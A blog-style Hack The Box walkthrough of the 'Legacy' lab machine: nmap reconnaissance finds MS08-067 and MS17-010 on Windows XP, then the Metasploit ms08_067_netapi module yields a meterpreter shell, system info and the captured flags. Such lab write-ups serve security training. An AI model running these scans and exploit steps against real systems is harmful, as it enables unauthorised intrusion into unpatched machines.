---                                                                                           
layout: post                                                                                  
title:  "Legacy"                                                                            
date:   2020-02-16 02:49:57 +0000                                                             
categories: HTB-Walkthrough                                                                   
---                           

![legacy](/assets/img/legacy.png)

Another beginner's box in HTB is Legacy, lets run nmap and see what we're dealing with...

` nmap -sCV -p- 10.10.10.4 |tee -a legacy.txt `

this scan is a bit like `-A`, it runs all the default nse scripts on the host, and looks for
service information.


```

 Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-06 13:01 GMT
Nmap scan report for 10.10.10.4
Host is up (0.12s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: -4h00m00s, deviation: 1h24m50s, median: -5h00m00s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:3e:e1 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2019-11-06T12:05:37+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

```

Ok, lets home in on the discovered ports...

```

root@kali:~/HTB/prep/legacy# nmap -p139,445 -sSV 10.10.10.4 --script=vuln
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-06 13:17 GMT
Nmap scan report for 10.10.10.4
Host is up (0.15s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

```

Looks like this target is vulnerable to the old smb ms08_067_netapi exploit, and also the infamous ms17-010 EternalBlue exploit.
In this instence we're going to try the older netapi one, we'll keep the devistating EternalBlue for another box...

In the msfconsole we can use the `info` command to ...well...get more info!

```

msf5 exploit(windows/smb/ms08_067_netapi) > info

       Name: MS08-067 Microsoft Server Service Relative Path Stack Corruption
     Module: exploit/windows/smb/ms08_067_netapi
   Platform: Windows
       Arch: 
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Great
  Disclosed: 2008-10-28

Provided by:
  hdm <x@hdm.io>
  Brett Moore <brett.moore@insomniasec.com>
  frank2 <frank2@dc949.org>
  jduck <jduck@metasploit.com>

<--snip-->

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  RHOSTS   10.10.10.4       yes       The target address range or CIDR identifier
  RPORT    445              yes       The SMB service port (TCP)
  SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Payload information:
  Space: 408
  Avoid: 8 characters

Description:
  This module exploits a parsing flaw in the path canonicalization 
  code of NetAPI32.dll through the Server Service. This module is 
  capable of bypassing NX on some operating systems and service packs. 
  The correct target must be used to prevent the Server Service (along 
  with a dozen others in the same process) from crashing. Windows XP 
  targets seem to handle multiple successful exploitation events, but 
  2003 targets will often crash or hang on subsequent attempts. This 
  is just the first version of this module, full support for NX bypass 
  on 2003, along with other platforms, is still in development.

References:
  https://cvedetails.com/cve/CVE-2008-4250/
  OSVDB (49243)
  https://technet.microsoft.com/en-us/library/security/MS08-067
  http://www.rapid7.com/vulndb/lookup/dcerpc-ms-netapi-netpathcanonicalize-dos


```

Use the default payload with this one, no need to use the `set payload` command.
triggering the `exploit` gives us a meterpreter shell.

```

meterpreter > ipconfig

Interface  1
============
Name         : MS TCP Loopback interface
Hardware MAC : 00:00:00:00:00:00
MTU          : 1520
IPv4 Address : 127.0.0.1


Interface 65539
============
Name         : AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport
Hardware MAC : 00:50:56:b9:3e:e1
MTU          : 1500
IPv4 Address : 10.10.10.4
IPv4 Netmask : 255.255.255.0

meterpreter > sysinfo
Computer        : LEGACY
OS              : Windows XP (Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > cat root.txt
# 99xxxxxxxxxxxxxxxxxxxxxxxxx3

```

This exploit is impressive, we already have elevated privilages, and can access both the user and Administrator(root) flags.

```

meterpreter > dir
Listing: C:\Documents and Settings\john\desktop
===============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  32    fil   2017-03-16 06:19:49 +0000  user.txt

meterpreter > cat user.txt
# exxxxxxxxxxxxxxxxxxxxxxxxxf

```

1. scan Target
2. identify vulnerabilities
3. execute exploit to gain access and/or system/root privilages.
4. get flags


###################################
